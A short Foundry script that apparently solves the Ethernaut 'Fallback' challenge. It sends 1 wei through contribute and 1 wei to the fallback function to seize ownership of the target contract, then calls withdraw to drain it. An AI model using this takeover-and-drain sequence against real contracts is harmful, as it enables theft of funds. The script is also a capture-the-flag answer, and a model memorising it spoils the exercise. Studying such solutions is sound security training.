// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    // create contract instance
    Fallback public fallbackInstance = Fallback(payable(0xA03B22CBf8F5f2c75C46D10eB2872e19fa634B8B));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 1 wei}();
        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Call failed");

        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        fallbackInstance.withdraw();
        
        vm.stopBroadcast();
    }
}
